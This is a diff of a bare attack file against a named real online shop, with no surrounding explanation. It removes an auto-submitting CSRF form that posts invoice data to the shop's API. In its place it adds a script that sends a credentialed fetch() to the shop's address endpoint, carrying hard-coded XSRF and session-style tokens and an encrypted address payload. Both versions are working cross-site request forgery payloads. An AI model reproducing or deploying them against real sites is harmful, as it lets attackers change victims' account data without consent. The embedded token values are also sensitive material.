@@ -1,22 +1,35 @@
-<html>
-  <meta name="referrer" content="unsafe-url">
-  <body>
-    <form id="csrf-form" method="POST" action="https://www.opposhop.cn/cn/oapi/users/web/invoice">
-      <input type="hidden" name="id" value=""/>
-      <input type="hidden" name="type" value="1"/>
-      <input type="hidden" name="title" value="dsadsa"/>
-      <input type="hidden" name="taxNo" value=""/>
-      <input type="hidden" name="useDefault" value="1"/>
-      <input type="hidden" name="invoiceType" value="1"/>
-      <input type="hidden" name="address" value=""/>
-      <input type="hidden" name="mobile" value=""/>
-      <input type="hidden" name="bankName" value=""/>
-      <input type="hidden" name="bankAccount" value=""/>
-      <input type="submit" value="Submit">
-    </form>
-
-    <script>
-      document.getElementById('csrf-form').submit();
-    </script>
-  </body>
-</html>
+<script>fetch("https://www.opposhop.cn/cn/oapi/users/web/address", {
+  "headers": {
+    "accept": "application/json, text/plain, */*",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "no-cache",
+    "consttoken": "6PptIFYbBaNAAxQBRFLTyoWzrkMLAb8o@bj",
+    "content-type": "application/x-www-form-urlencoded",
+    "encryption": "PZ1f90hf1TY6LvF5G/YL++aLPbmzNcZfQ2oL7oGhbg2QHDxrNK/hcug1VGGaBMbi2MEHTtbGoSPIfr3bAocu4Q==",
+    "notoast": "1",
+    "pragma": "no-cache",
+    "reqfilter": "true",
+    "s_channel": "h5_web",
+    "sec-ch-ua": "\"Google Chrome\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": "\"Windows\"",
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-origin",
+    "source_type": "504",
+    "uc": "direct",
+    "um": "direct",
+    "us": "direct",
+    "ut": "direct",
+    "utm_campaign": "direct",
+    "utm_medium": "direct",
+    "utm_source": "direct",
+    "utm_term": "direct",
+    "x-xsrf-token": "a4425bf0-72d8-409e-a4d4-f78acf6fa758"
+  },
+  "referrer": "https://www.opposhop.cn/cn/web/user/addresses",
+  "body": "receiver=eMgK7XGsutOUHYLi1Uo5TQ%3D%3D&mobile=MfphJwFEQK4ixuOctQmXlA%3D%3D&address=2O2SqjM1wy0x20gg9I87Ug%3D%3D&isDefault=1&provinceId=11&cityId=122&districtId=46556&townId=48353",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});</script>
